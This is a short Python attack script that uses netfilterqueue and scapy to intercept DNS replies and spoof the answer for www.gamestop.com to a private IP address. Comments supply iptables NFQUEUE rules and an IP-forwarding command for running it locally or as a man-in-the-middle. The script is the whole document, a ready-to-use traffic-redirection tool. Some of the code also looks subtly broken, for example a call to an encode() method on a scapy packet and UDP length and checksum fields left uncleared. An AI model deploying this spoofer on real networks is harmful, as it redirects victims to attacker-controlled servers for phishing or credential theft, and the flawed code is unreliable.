#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.gamestop.com" in qname.decode():
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname.decode(), rdata="192.168.110.138")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum

            print(scapy_packet.show())
            packet.set_payload(bytes(scapy_packet.encode()))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

#iptables --flush
#For local
#iptables -I OUTPUT -j NFQUEUE --queue-num 0
#iptables -I INPUT -j NFQUEUE --queue-num 0

#For Remote
#iptables -I FORWARD -j NFQUEUE --queue-num 0

#needed to not break internet
# echo 1 > /proc/sys/net/ipv4/ip_forward